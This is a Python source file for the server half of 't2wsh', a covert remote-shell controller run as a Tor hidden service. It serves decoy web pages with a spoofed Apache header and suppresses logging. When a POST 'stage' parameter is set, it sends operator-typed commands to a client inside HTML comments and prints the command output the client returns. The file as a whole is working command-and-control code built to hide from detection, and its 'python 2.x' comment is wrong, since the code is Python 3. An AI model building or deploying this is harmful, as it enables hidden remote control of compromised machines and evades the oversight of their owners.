# python 2.x

# handles connections from the client
# must be run as a Tor hidden service
# returns some normal web content unless the appropriate POST parameter is seen
# encoding is not quite right - multi-line output displays poorly

from http.server import BaseHTTPRequestHandler,HTTPServer
from cgi import FieldStorage

port = 80

# serve this stuff to look like a normal httpd
decoywebroot = '/usr/local/www/'

class T2WSHHandler(BaseHTTPRequestHandler):

	'''
	def servefile(self):
		#serve a static file
		if self.path=='/':
			self.path='index.html'
		try:
			sendReply = True
			# Open the static file requested and send it
			self.send_response(200)
			self.send_header('Content-type','text/html')
			self.end_headers()
			f = open(decoywebroot + self.path) 
			self.wfile.write(bytes(f.read(), 'UTF-8'))
			f.close()
			return
		except IOError:
			self.send_error(404,'Not Found')
		'''

	def do_GET(self):
		'''handle GETs'''
		if self.path=='/':
			self.path='index.html'
		try:
			sendReply = True
			# Open the static file requested and send it
			self.send_response(200)
			self.send_header('Content-type','text/html')
			self.send_header('Server', 'Apache/2.2')
			self.end_headers()
			f = open(decoywebroot + self.path) 
			html = bytes(f.read(),'UTF-8')
			self.wfile.write(html)
			f.close()
			return
		except IOError:
			self.send_error(404,'Not Found')

	def do_POST(self):
		'''handle POSTS. serves static files unless POST parameter
		"stage" equals "probe" or "output", in which case it becomes
		a shell handler'''
		data = FieldStorage(
			fp=self.rfile, 
			headers=self.headers,
			environ={'REQUEST_METHOD':'POST',
		                'CONTENT_TYPE':self.headers['Content-Type'],
			})
	
		mimetype='text/html'
		self.send_response(200)
		self.send_header('Content-type', mimetype)
		self.end_headers()
		stage = data['stage'].value
		if stage == '':
			if self.path=='/':
				self.path='index.html'
			try:
				sendReply = True
				# Open the static file requested and send it
				self.send_response(200)
				self.send_header('Content-type','text/html')
				self.send_header('Server', 'Apache/2.2')
				self.end_headers()
				f = open(decoywebroot + self.path) 
				html = bytes(f.read(), 'UTF-8')
				self.wfile.write(html)
				f.close()
				return
			except IOError:
				self.send_error(404,'Not Found')
		elif stage == 'probe':
			cmd = input('\n\nt2wSH~$ ')
			if cmd == 'endsession':
				print('[i] client process should die momentarily')
			html = '<!-- t2wsh;;%s;;-->' % (cmd)
			html = bytes(html, 'UTF-8')
			self.wfile.write(html)
		elif stage == 'output' and data['cmdout'].value:
			output = data['cmdout'].value
			for i in output:
				print(str(i), end=' ')
			#for l in output.splitlines():
			#	print(l)
		return			

	def log_message(self, format, *args):
		return
try:
	# Create a web server and define the handler to manage the
	# incoming request
	server = HTTPServer(('127.0.0.1', port), T2WSHHandler)
	print('\n[i] started t2wsh http server on port %s' % (port))
	server.serve_forever()

except KeyboardInterrupt:
	print('[i] interrupt received, shutting down t2wsh http server')
	server.socket.close()
